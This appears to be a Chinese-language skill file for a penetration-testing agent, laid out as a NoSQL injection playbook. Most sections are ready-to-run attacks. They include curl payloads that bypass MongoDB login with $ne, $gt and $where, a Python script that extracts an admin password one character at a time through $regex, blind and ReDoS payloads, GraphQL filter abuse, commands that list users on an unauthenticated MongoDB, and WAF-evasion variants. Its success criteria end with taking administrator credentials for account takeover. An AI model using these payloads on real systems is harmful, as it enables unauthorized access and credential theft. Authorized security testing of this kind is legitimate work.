---
name: 无表
description: >-
 NoSQL 注入完整手法：MongoDB 操作符注入（$ne/$gt/$regex）、
 GraphQL + MongoDB 联合查询、PHP/Node.js 反序列化 + MongoDB、
 认证绕过（$ne:null/$gt:空串）、正则枚举用户名/密码、
 Mongoose/Spring Data 类型混淆注入。
 
 关系型 SQL 注入走 sqlmap-tamper-kit；GraphQL 字段走 jwt-bypass-pentest。
version: 1.0.0
---

# NoSQL 注入完整手法

## 作业入口（先跑这个）

```bash
python3 炼蛊房/param_abuse_probe.py nosql --url https://授权/api/login --case <案>
```

作业手法：`传承/无表.md`。关系型 SQL 走 `sqlmap_kit.py ladder`。

**前提**：目标在 `授权范围`。

---

## 快速识别指纹

```
• POST body 出现 {"username":"xx","password":"xx"} → 试 JSON 操作符注入
• 报错含 "Cast to ObjectId"、"MongoError"、"BSONTypeError" → 确认 MongoDB
• URL 参数 ?id=... 或 ?q=... → 试数组注入
• 响应时间变化（regex DoS 探测）
• GraphQL 底层 + MongoDB → 联合查询面
```

---

## §1 认证绕过（MongoDB 操作符注入）

### JSON Body 直接注入

```bash
# 基础 $ne 认证绕过
curl -s -X POST https://授权站/api/login \
 -H "Content-Type: application/json" \
 -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# $gt 变体
curl -s -X POST https://授权站/api/login \
 -H "Content-Type: application/json" \
 -d '{"username":{"$gt":""},"password":{"$gt":""}}'

# $where 注入（旧 MongoDB）
curl -s -X POST https://授权站/api/login \
 -H "Content-Type: application/json" \
 -d '{"$where":"sleep(3000)"}'
```

### URL 参数注入（PHP 风格）

```bash
# 若 URL 参数被 parse_str 解析为数组
curl "https://授权站/api/user?username[$ne]=foo&password[$ne]=bar"
curl "https://授权站/api/user?id[$gt]=0"

# POST form-urlencoded 同理
curl -X POST https://授权站/api/login \
 -d "username[$ne]=foo&password[$ne]=bar"
```

---

## §2 $regex 正则枚举（提取数据）

```python
import requests, string

base_url = "https://授权站/api/login"
headers = {"Content-Type": "application/json"}

# 枚举 admin 的密码（逐字符）
known = ""
charset = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*"

while True:
 found = False
 for c in charset:
 payload = {
 "username": "admin",
 "password": {"$regex": f"^{known}{c}"}
 }
 r = requests.post(base_url, json=payload, headers=headers, timeout=5)
 if r.status_code == 200 and "token" in r.text:
 known += c
 print(f"[+] {known}")
 found = True
 break
 if not found:
 print(f"[*] 最终结果: {known}")
 break
```

---

## §3 时间盲注（$where + sleep）

```bash
# MongoDB 3.x 之前支持 $where，可以用 sleep 探测
# 测试布尔条件
curl -s -X POST https://授权站/api/find \
 -H "Content-Type: application/json" \
 -d '{"$where":"if(this.username[0]=='\''a'\'') sleep(2000); return true;"}' \
 -w "\n时间: %{time_total}s\n"

# 新版：用 $regex + 复杂模式导致 CPU 高（ReDoS）
# (a+)+ 类构造对长字符串执行慢
curl -s -X POST https://授权站/api/search \
 -H "Content-Type: application/json" \
 -d '{"query":{"$regex":"^(a+)+$","$options":"i"}}'
```

---

## §4 Node.js / Express + Mongoose 类型混淆

```bash
# Mongoose 收到数组会跳过类型检查
# JSON: {"password": {"$gt": ""}} 绕过
# 或传数组: {"password": ["hash1", "hash2"]}（某些 ORM 版本 $in 合并）

# express-validator 前置检查后仍可注入的场景：
curl -s -X POST https://授权站/api/user/login \
 -H "Content-Type: application/json" \
 -d '{"username":"admin","password":{"$regex":".*","$options":"si"}}'
```

---

## §5 GraphQL + MongoDB 联合

```graphql
# 先 introspection 摸类型（见 jwt-bypass-pentest → GraphQL 段）
# 找到 filterable 字段后注入操作符
{
 users(filter: {username: {_ne: null}, password: {_ne: null}}) {
 id username email role
 }
}

# hasura / prisma 风格
{
 users(where: {password: {_neq: ""}}) { id username token }
}
```

---

## §6 Blind NoSQL Injection 工具

```bash
# NoSQLMap（自动化）
git clone https://github.com/codingo/NoSQLMap
python3 nosqlmap.py

# nosql-exploitation-framework
pip install nosqlexploitation
nosqlexploit -u https://授权站/api/login \
 -p '{"username":"INJECT","password":"test"}' \
 --technique regex --dbname mydb

# Burp Intruder 手动：
# 位置标记放在 value 上，wordlist 用操作符字典:
# {"$ne":null} {"$gt":""} {"$exists":true} {"$regex":".*"}
```

---

## §7 MongoDB 直连（内网/暴露端口）

```bash
# 发现 27017 开放
nmap -sV --script=mongodb-info -p 27017 目标IP

# mongosh 直连（无鉴权）
mongosh --host 目标IP:27017
show dbs
use admin
db.auth('','') # 尝试空密码
db.system.users.find() # 列用户

# mongoaudit 自动检测
pip install mongoaudit
mongoaudit -H 目标IP -P 27017
```

---

## §8 WAF 绕过变体

```json
// 大小写混合
{"$Ne": null} {"$GT": ""}

// Unicode 编码
{"\u0024ne": null}

// 分拆操作符
{"username": {"$in": ["admin", "root", "superuser"]}}

// 嵌套绕过
{"username": {"$not": {"$size": 0}}}

// 请求分割（multipart）
Content-Disposition: form-data; name="password"

{"$ne":"x"}
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 操作符被解析（报错变化或响应 200） |
| L2 | 认证绕过成功 / 枚举到用户数据 |
| L3 | 获取管理员凭据或 JWT 再做接管 |

---

## 真源

- 手法：`传承/无表.md`
- 工具：`python3 炼蛊房/param_abuse_probe.py nosql --help`
- 长文：`智道藏书/旁支传承/skills/nosql-injection/SKILL.md`
